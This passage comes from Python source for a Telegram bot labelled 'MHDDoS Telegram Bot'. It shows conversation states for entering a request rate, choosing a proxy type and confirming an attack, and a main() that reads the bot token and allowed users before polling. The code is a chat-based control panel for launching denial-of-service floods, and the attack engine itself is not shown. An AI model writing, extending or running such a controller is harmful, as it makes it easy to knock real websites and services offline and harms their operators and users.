                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_RPC.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_PROXY_TYPE.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.CONFIRM_ATTACK.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.TOOLS_MENU.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.TOOLS_INPUT.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_tools_input),
                    CallbackQueryHandler(self.button_callback),
                ],
            },
            fallbacks=[
                CommandHandler("start", self.start_command),
                CommandHandler("help", self.help_command),
                CommandHandler("status", self.status_command),
                CommandHandler("stop", self.stop_command),
            ],
            allow_reentry=True,
        )
        
        application.add_handler(conv_handler)
        application.add_handler(CommandHandler("help", self.help_command))
        application.add_handler(CommandHandler("status", self.status_command))
        application.add_handler(CommandHandler("stop", self.stop_command))
        
        logger.info("Starting MHDDoS Telegram Bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)


def main():
    """Main entry point."""
    # Get bot token from environment or config
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    
    if not token:
        # Try to load from config.json
        config_path = __dir__ / "config.json"
        if config_path.exists():
            try:
                with open(config_path) as f:
                    config = load(f)
                    token = config.get("telegram_bot_token")
            except JSONDecodeError as e:
                print(f"Error: config.json contains invalid JSON: {str(e)}")
                return
            except Exception as e:
                print(f"Error: Failed to read config.json: {str(e)}")
                return
    
    if not token:
        print("Error: TELEGRAM_BOT_TOKEN environment variable or telegram_bot_token in config.json is required.")
        print("Set it with: export TELEGRAM_BOT_TOKEN='your-bot-token'")
        print("Or add 'telegram_bot_token': 'your-bot-token' to config.json")
        return
    
    # Get allowed users (optional)
    allowed_users = []
    allowed_users_env = os.environ.get("TELEGRAM_ALLOWED_USERS")
    if allowed_users_env:
        for uid in allowed_users_env.split(","):
            uid = uid.strip()
            if uid:
                try:
                    allowed_users.append(int(uid))
                except ValueError:
                    print(f"Warning: Invalid user ID '{uid}' in TELEGRAM_ALLOWED_USERS - must be a numeric Telegram user ID, skipping")
    
    # Create and run bot
    bot = MHDDoSBot(token, allowed_users)
    bot.run()


if __name__ == "__main__":
    main()
